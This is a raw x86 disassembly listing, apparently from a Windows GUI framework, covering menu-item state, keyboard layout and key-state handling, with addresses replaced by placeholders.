call sub_44a4ac
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov edx ebx
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_44a368
mov eax [ ebp - 0x10 ]
mov edx r-xdata
call j_sub_44a294
jne r-xdata
sub ebx 0x4
mov ebx [ ebx ]
mov edx [ esi ]
mov eax esi
call sub_4494dc
mov eax [ esi ]
movzx eax [ eax + edi * 2 - 0x2 ]
call sub_41d08c
cmp al 0x7
je r-xdata
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_44a1b8
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx ebx
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_44a368
push [ ebp - 0x14 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_44a1b8
jmp r-xdata
sub ebx 0x4
mov ebx [ ebx ]
mov edx [ esi ]
mov eax esi
call sub_4494dc
sub_466cd0
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4671f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x25 ] 0x0
test bl bl
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_449d80
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_4671bb
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42723c
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42723c
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42723c
mov [ ebp - 0x2c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42723c
mov [ ebp - 0x8 ] eax
mov eax esi
call sub_466084
dec eax
test eax eax
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_449d80
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x30 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4671f9
lea eax [ ebp - 0x48 ]
mov edx 0x4
call j_sub_44936c
lea eax [ ebp - 0x24 ]
mov edx 0x4
call j_sub_44936c
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax esi
call sub_4673b4
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc [ ebp - 0x30 ]
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_466094
mov eax [ eax + 0x30 ]
mov edx r-xdata
call j_sub_44a294
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x25 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_466a78
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
mov [ ebp - 0x30 ] eax
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_466094
cmp [ eax + 0x3a ] 0x0
je r-xdata
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_466094
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4481b0
mov eax [ ebp - 0x2c ]
call sub_4481b0
mov eax [ ebp - 0x14 ]
call sub_4481b0
mov eax [ ebp - 0xc ]
call sub_4481b0
retn
inc eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x30 ] 0x0
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_466a78
pop ecx
lea eax [ ebp - 0x20 ]
call sub_4494ec
call sub_449fc4
cmp ebx eax
jle r-xdata
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_466094
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_469090
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x1c ]
call sub_434c78
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x20 ]
call sub_449d2c
inc [ ebp - 0x30 ]
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x20 ]
mov eax r-xdata
call sub_43b058
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov esi [ ebp - 0x20 ]
test esi esi
je r-xdata
dec [ ebp - 0x30 ]
cmp [ ebp - 0x30 ] 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x1c ]
call sub_43b058
test eax eax
je r-xdata
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_466094
push eax
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_466094
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x2c ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc esi
mov [ ebp - 0x30 ] 0x0
cmp [ esi + ebx * 2 - 0x2 ] 0xd800
jb r-xdata
mov eax esi
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
push ebp
mov eax [ ebp - 0x1c ]
call sub_466a48
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x20 ]
mov eax r-xdata
call sub_43b058
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x24 ]
call sub_449d80
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
cmp eax 0x0
jl r-xdata
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x2c ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov ebx eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx ebx
mov eax [ ebp - 0x2c ]
mov ebx [ eax ]
call [ ebx + 0x78 ]
inc [ ebp - 0x30 ]
dec esi
jne r-xdata
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x20 ]
call sub_44a368
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x1c ]
call sub_434c78
push ebp
mov eax [ ebp - 0x1c ]
call sub_466a48
pop ecx
test al al
je r-xdata
cmp [ esi + ebx * 2 - 0x2 ] 0xdfff
ja r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x20 ]
call sub_4494dc
mov esi eax
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_466094
add eax 0x30
push eax
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_466094
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_468f74
mov edx [ ebp - 0x40 ]
pop eax
call sub_449d2c
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_466094
push eax
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_466094
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x2c ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
inc ebx
jmp r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
lea edx [ ebp - 0x20 ]
mov ecx ebx
mov eax r-xdata
call sub_44a4ac
lea eax [ ebp - 0x20 ]
mov ecx ebx
mov edx [ ebp - 0x1c ]
call sub_466afc
jmp r-xdata
lea eax [ ebp - 0x48 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x18 ]
call sub_44a368
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x20 ]
xor ecx ecx
call sub_466afc
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x18 ]
call sub_4494dc
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
lea edx [ ebp - 0x18 ]
mov ecx 0x1
xchg edx eax
call sub_44a438
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x18 ]
call sub_4494dc
sub_46721b
inc [ ecx ]
add [ eax ] al
add [ esi ] ah
add [ eax ] al
add [ edx ] bh
push eax
aaa
je r-xdata
retn
mov [ eax + 0x37 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_46725c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_466084
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_466084
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
movzx eax [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4673e4
test al al
je r-xdata
mov eax esi
call sub_466084
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_466094
call sub_467234
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_466094
cmp [ eax + 0x3a ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_466094
cmp [ eax + 0x3a ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_466094
mov [ eax + 0x3a ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_466094
call sub_467234
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_466094
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3a ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_466094
cmp [ eax + 0x3a ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_466094
mov [ eax + 0x3a ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_466094
call sub_467234
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3a ] 0x0
jne r-xdata
mov [ ebp + 0x3a ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3a ] 0x1
mov [ esp ] 0x1
sub_4673b4
push ebx
mov ebx eax
movzx eax [ ebx + 0x37 ]
cmp al 0x2
jne r-xdata
and eax 0x7f
movzx eax [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax [ ebx + 0x60 ]
call sub_4673b4
and eax 0x7f
movzx eax [ eax + rw-data ]
sub_4673e4
push ebx
mov ebx eax
movzx eax [ ebx + 0x38 ]
cmp al 0x2
jne r-xdata
and eax 0x7f
movzx eax [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax [ ebx + 0x60 ]
call sub_4673e4
and eax 0x7f
movzx eax [ eax + rw-data ]
sub_467414
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_462d48
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x6c ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov esi eax
mov [ ebx + 0x40 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x3d ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_42e278
mov eax [ ebx + 0x34 ]
mov [ eax + 0x37 ] 0x0
mov [ eax + 0x38 ] 0x0
mov eax ebx
call sub_46849c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_4674c0
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_4481b0
mov eax [ esi + 0x40 ]
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42e2c4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_467550
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x4c ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0xac ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_466084
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x5c ]
cmp eax edx
jne r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_466094
call sub_467550
pop ecx
test al al
je r-xdata
sub_4675ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_467550
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x64 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_4628b0
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_46761c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_4675ec
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x50 ] 0x0
je r-xdata
mov eax esi
call sub_468cd8
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x50 ]
mov eax [ eax + 0x60 ]
sub_46768c
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_4675ec
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_4676a8
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_4675ec
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_466cd0
mov ebx eax
xor edx edx
mov eax edi
call sub_46725c
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_4665bc
mov eax [ esi + 0x34 ]
call sub_4665bc
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
test eax eax
je r-xdata
mov eax edi
call sub_4632f8
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x287 ] 0x2
jne r-xdata
cmp edi [ ebx + 0x2ac ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x36c ]
push eax
call SendMessageW
test eax eax
je r-xdata
mov eax ebx
call sub_496868
push eax
call DrawMenuBar
sub_467784
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4678bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x20 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
call GetKeyboardLayoutNameW
mov dl 0x1
mov eax [ r-xdata ]
call sub_430ca8
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_467893
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx 0x80000002
mov eax [ ebp - 0xc ]
call sub_430d48
lea eax [ ebp - 0x28 ]
lea edx [ ebp - 0x20 ]
mov ecx 0xa
call sub_449f14
mov ecx [ ebp - 0x28 ]
lea eax [ ebp - 0x24 ]
mov edx r-xdata
call sub_44a0e8
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_430dac
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46789a
mov eax [ ebp - 0xc ]
call sub_4481b0
retn
lea ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_430ff8
mov edx 0x8000
mov eax [ ebp - 0x4 ]
call sub_43c0b4
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_467876
push [ fs : edx ]
mov [ fs : edx ] esp
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_41d36c
mov ebx eax
call ebx
movzx eax [ eax + 0x28 ]
and ax 0x1
cmp ax 0x1
sete [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call FreeLibrary
retn
sub_46798c
push ebx
xor ebx ebx
push 0xa5
call GetKeyState
test ax ax
jge r-xdata
mov eax ebx
pop ebx
retn
push 0x0
call GetKeyboardLayout
mov ebx eax
cmp ebx [ rw-data ]
je r-xdata
movzx ebx [ rw-data ]
call sub_467784
mov [ rw-data ] ebx
sub_4679c8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movzx ebx [ esp + 0x4 ]
test bx bx
je r-xdata
mov eax ebx
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add bx 0x2000
test [ esp + 0xb ] 0x20
je r-xdata
add bx 0x4000
add bx 0x8000
sub_467a28
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
movzx eax [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_467a28
pop ecx
mov [ ebp - 0x1 ] al
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x35 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_467b4e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_4675ec
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
movzx eax [ eax + 0x5c ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_4665bc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_467a18
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
movzx eax [ eax + 0x5c ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_467b7c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi edx
mov [ ebp - 0xc ] eax
xor ebx ebx
call sub_46798c
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_4679c8
mov [ ebp - 0x6 ] ax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4325a4
xor eax eax
push ebp
push sub_467c4f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4325a4
xor eax eax
push ebp
push sub_467c24
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_467a28
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_43259c
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467c56
mov eax [ rw-data ]
call sub_43259c
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_4675ec
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_467c56
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov bl 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_467c78
push ebp
mov ebp esp
add esp 0xffffff30
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ ebp - 0x2c ] 0x10
mov [ ebp - 0x8 ] 0x50
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov [ ebp - 0x30 ] 0x30
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jle r-xdata
lea eax [ ebp - 0xd0 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_467d71
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x30 ]
push eax
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoW
test eax eax
je r-xdata
mov [ ebp - 0x30 ] 0x2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
mov eax ebx
call sub_46807c
mov edx [ ebp - 0x28 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
jne r-xdata
mov eax ebx
call sub_46807c
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ ebp - 0x28 ]
and edx 0xffff9fff
or eax edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x2c ] 0x10
lea eax [ ebp - 0x30 ]
push eax
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoW
test eax eax
je r-xdata
call sub_448d2c
jmp r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_467d80
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x400 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff6
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
sar eax 0x1
jns r-xdata
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x404 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_4683cc
mov eax ebx
call sub_4360c4
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
mov edi eax
test di 0x2
je r-xdata
adc eax 0x0
test di 0x40
je r-xdata
mov [ ebx ] 0x24
